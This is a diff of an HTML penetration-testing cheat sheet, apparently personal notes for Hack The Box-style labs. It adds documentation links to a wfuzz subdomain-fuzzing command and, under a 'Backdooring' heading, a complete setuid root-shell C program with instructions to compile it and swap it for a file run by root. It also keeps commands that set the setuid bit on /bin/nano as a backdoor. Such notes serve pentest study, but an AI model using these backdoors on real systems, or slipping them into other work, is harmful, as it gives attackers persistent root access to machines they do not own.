@@ -97,6 +97,9 @@ ip -6 neigh	#IPv6 "ARP table"
 <hr>
 <p><h3>Subdomain fuzzing:</h3></p>
 <pre style="background-color:black;color:white;">
+#https://wfuzz.readthedocs.io/en/latest/user/basicusage.html
+#https://wfuzz.readthedocs.io/en/latest/user/advanced.html
+
 wfuzz -w cewl_output -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb"
 #if host is not resolved, add the name to /etc/hosts file.
 </pre>
@@ -1169,7 +1172,27 @@ https://github.com/Genetic-Malware/Ebowla	#usage example - https://www.youtube.c
 <hr>
 <p><h3>Backdooring</h3></p>
 <pre style="background-color:black;color:white;">
-setuid bit combina (root permissions required) - https://gist.github.com/dergachev/7916152
+#setuid bit combina (root permissions required) - https://gist.github.com/dergachev/7916152
+
+#setuid.c file#
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main ( int argc, char *argv[] )
+{
+	setreuid(0,0);
+	execve("/bin/sh", NULL, NULL);
+}
+
+**Compile it to target's architecture and replace with a file to be executed by root**
+gcc -m32 -o setuid setuid.c #32bit
+
+Errors in compilation?
+apt install gcc-multilib
+
+Example: https://www.youtube.com/watch?v=9MeBiP637ZA
+
 ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano
 chmod u+s /bin/nano    # installs the backdoor
 </pre>
